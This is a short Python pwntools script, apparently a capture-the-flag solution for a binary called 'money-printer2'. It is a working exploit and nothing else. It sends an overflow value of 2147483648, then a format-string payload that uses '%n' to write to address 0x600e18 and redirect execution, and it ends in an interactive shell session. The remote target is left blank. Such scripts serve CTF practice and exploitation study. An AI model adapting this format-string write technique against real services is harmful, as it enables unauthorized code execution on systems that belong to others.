#!/usr/bin/python3

from pwn import *

exe = ELF('money-printer2', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+308

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
sla(b"?\n", b"2147483648")
payload = p64(0x0000000000600e18).ljust(8)
payload += b"%4196709c%138$n"
sla(b"?\n", payload)

p.interactive()
